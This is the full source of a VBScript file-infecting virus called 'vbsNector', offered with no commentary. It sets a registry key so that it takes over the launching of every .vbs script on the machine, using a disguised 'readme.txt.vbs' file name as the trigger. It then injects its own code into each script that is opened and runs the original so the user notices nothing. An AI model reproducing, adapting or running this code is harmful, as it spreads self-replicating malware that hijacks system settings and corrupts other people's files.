Call vbsNector
WScript.quit
'
Sub vbsNector()
Dim vi

Set s = WScript.Arguments
Set objShell = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
Myscript = WScript.ScriptFullName
Set f = fs.opentextfile(Myscript,1)
vir = f.ReadAll
f.close
Set f = Nothing
If InStr(1,LCase(Myscript),"readme.txt.vbs",1) Then
objShell.RegWrite "HKEY_CLASSES_ROOT\VBSFile\Shell\Open\Command\",fs.GetSpecialFolder(0) + "\WScript.EXE " + Myscript + " %1 " + Chr(34) + fs.GetSpecialFolder(0) + "\WScript.EXE " + Chr(34) + "%1" + Chr(34) + " %*" + Chr(34)
End If

If s.Count > 1 Then
		Set f = fs.opentextfile(s(0),1)
		vi = f.ReadAll
		f.close
		Set f = Nothing

		Set f = fs.createtextfile("$ttyk$.vb_")
	
		If InStr(1,vi,"vbsNector",1) Then
			Exit Sub
		End If
	
		ntt = InStr(1,vir,"'",1)
	
		f.write "call vbsNector" + vbCrLf
		f.write vi + vbCrLf
		f.write Mid(vir,ntt,Len(vir)-ntt)
			
		f.close
		Set f = Nothing
	
		objShell.Run s(1)
		fs.CopyFile "$ttyk$.vb_",s(0)
End If
End Sub

